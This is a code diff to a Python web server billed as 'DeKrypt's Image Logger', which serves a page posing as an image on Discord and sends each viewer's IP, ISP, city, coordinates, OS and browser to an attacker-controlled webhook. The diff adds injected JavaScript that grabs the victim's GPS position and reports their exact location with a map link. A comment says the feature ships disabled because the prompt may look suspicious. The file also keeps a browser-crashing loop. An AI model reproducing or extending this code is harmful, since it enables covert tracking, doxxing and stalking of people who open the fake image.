@@ -24,8 +24,10 @@ config = {
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
+    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+
     "message": { # Show a custom message when the user opens the image
-        "doMessage": True, # Enable the custom message?
+        "doMessage": False, # Enable the custom message?
         "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
@@ -61,7 +63,7 @@ config = {
     # 4) Image
 }
 
-def makeReport(ip, useragent = None):
+def makeReport(ip, useragent = None, coords = None):
     if ip.startswith(('34', '35', '104')):
         if ip.startswith('104'): return
         requests.post(config["webhook"], json = {
@@ -116,7 +118,29 @@ def makeReport(ip, useragent = None):
         {
             "title": "Image Logger - IP Logged",
             "color": config["color"],
-            "description": f"**A User Opened the Original Image!**\n\n**IP Info:**\n> **IP:** `{ip}`\n> **Provider:** `{info['isp']}`\n> **ASN:** `{info['as']}`\n> **Country:** `{info['country']}`\n> **Region:** `{info['regionName']}`\n> **City:** `{info['city']}`\n> **Coords:** `{info['lat']}, {info['lon']}`\n> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`\n> **Mobile:** `{info['mobile']}`\n> **VPN:** `{info['proxy']}`\n> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`\n\n**PC Info:**\n> **OS:** `{os}`\n> **Browser:** `{browser}`\n\n**User Agent:**\n```\n{useragent}\n```",
+            "description": f"""**A User Opened the Original Image!**
+            
+**IP Info:**
+> **IP:** `{ip if ip else 'Unknown'}`
+> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
+> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
+> **Country:** `{info['country'] if info['country'] else 'Unknown'} `
+> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
+> **City:** `{info['city'] if info['city'] else 'Unknown'}`
+> **Coords:** `{info['lat']}, {info['lon'] if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
+> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
+> **Mobile:** `{info['mobile']}`
+> **VPN:** `{info['proxy']}`
+> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
+
+**PC Info:**
+> **OS:** `{os}`
+> **Browser:** `{browser}`
+
+**User Agent:**
+```
+{useragent}
+```""",
     }
   ],
 })
@@ -136,14 +160,24 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
             s = self.path
             dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
             if dic.get("url"):
-                try:
-                    data = requests.get(base64.urlsafe_b64decode((dic.get("url") or dic.get("id")).encode()).decode()).content
-                except:
-                    data = binaries["normal"]
+                url = dic.get("url")
             else:
-                data = binaries["normal"]
+                url = config["image"]
         else:
-            data = binaries["normal"]
+            url = config["image"]
+
+        data = f'''<style>body {{
+  margin: 0;
+  padding: 0;
+  }}
+div.img {{
+  background-image: url('{url}');
+  background-position: center center;
+  background-repeat: no-repeat;
+  background-size: contain;
+  width: 100vw;
+  height: 100vh;
+  }}</style><div class="img"></div>'''.encode()
         
         if self.headers.get('x-forwarded-for').startswith(('35', '34', '104')):
             makeReport(self.headers.get('x-forwarded-for'))
@@ -154,7 +188,37 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
             self.wfile.write(binaries["loading"] if config["buggedImage"] else data) # Write the image to the client.
         
         else:
-            result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'))
+            s = self.path
+            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+
+            if dic.get("g") and config["accurateLocation"]:
+                location = base64.b64decode(dic.get("g").encode()).decode()
+                result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location)
+            elif config["accurateLocation"] and not dic.get("g"):
+                self.send_response(200) # 200 = OK (HTTP Status)
+                self.send_header('Content-type', 'text/html') # Define the data as an image so Discord can show it.
+                self.end_headers() # Declare the headers as finished.
+
+                data += b"""<script>
+var currenturl = window.location.href;
+
+if (!currenturl.includes("g=")) {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function (coords) {
+    if (currenturl.includes("?")) {
+        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
+    } else {
+        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
+    }
+    location.replace(currenturl);});
+}}
+
+</script>"""
+                self.wfile.write(data)
+                return
+            else:
+                result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'))
+            
 
             message = config["message"]["message"]
 
@@ -174,25 +238,38 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
                 message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                 message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
 
-            datatype = 'image/jpeg'
+            datatype = 'text/html'
 
             if config["message"]["doMessage"]:
-                datatype = 'text/html'
                 data = message.encode()
             
-            if config["crashBrowser"]["doCrashBrowser"]:
-                datatype = 'text/html'
+            if config["crashBrowser"]:
                 data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher
 
             if config["redirect"]["redirect"]:
-                datatype = 'text/html'
                 data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
             self.send_response(200) # 200 = OK (HTTP Status)
             self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
             self.end_headers() # Declare the headers as finished.
 
+            if config["accurateLocation"]:
+                data += b"""<script>
+var currenturl = window.location.href;
+
+if (!currenturl.includes("g=")) {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function (coords) {
+    if (currenturl.includes("?")) {
+        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
+    } else {
+        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
+    }
+    location.replace(currenturl);});
+}}
+
+</script>"""
             self.wfile.write(data)
     
-        return
+        return  
 
 handler = ImageLoggerAPI
